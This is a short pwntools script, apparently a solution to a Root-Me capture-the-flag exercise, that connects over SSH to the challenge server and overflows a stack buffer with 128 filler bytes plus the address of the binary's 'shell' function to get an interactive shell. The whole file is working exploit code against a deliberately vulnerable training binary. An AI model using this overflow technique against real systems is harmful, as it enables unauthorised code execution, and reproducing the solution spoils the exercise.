from pwn import *
import struct

s = ssh(host='challenge02.root-me.org', user='app-systeme-ch15', password='app-systeme-ch15', port=2222)

p = s.process(['/challenge/app-systeme/ch15/ch15'])
elf = p.elf

shell_addr = hex(elf.symbols['shell'])

payload = chr(0x41) * 128
payload += struct.pack("I", int(shell_addr, 16))
p.sendline(payload)

p.interactive()
